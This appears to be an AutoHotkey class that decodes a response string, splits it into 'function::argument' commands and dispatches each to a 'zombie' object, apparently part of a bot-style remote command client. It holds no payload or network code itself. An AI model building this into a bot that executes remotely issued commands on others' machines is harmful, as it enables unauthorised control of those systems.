class Parser {
	static decoder ; Decoder dependency
	static zombie ; Zombie dependency
	static commands ; Commands dependency
	
	parseResponse(response)
	{
		decodedResponse := this.decoder.utfDecode( this.decoder.urlDecode(response) )
		
		if(!response){
			return false
		}
		
		commands := strSplit(decodedResponse, "|")
		
		for c in commands{
			command := commands[c]		
			;this.zombie.parseCommand(command)
			
			
			command := strSplit(command, "::")
			function := command[1]
			argument := command[2]
			
			this.zombie.doCommand(function, argument)
		}
	}
	
	; building
	setDecoder(decoder){
		this.decoder := decoder
		return this
	}
	
	setZombie(zombie){
		this.zombie := zombie
		return this
	}
	
	setCommands(commands){
		this.commands := commands
		return this
	}
}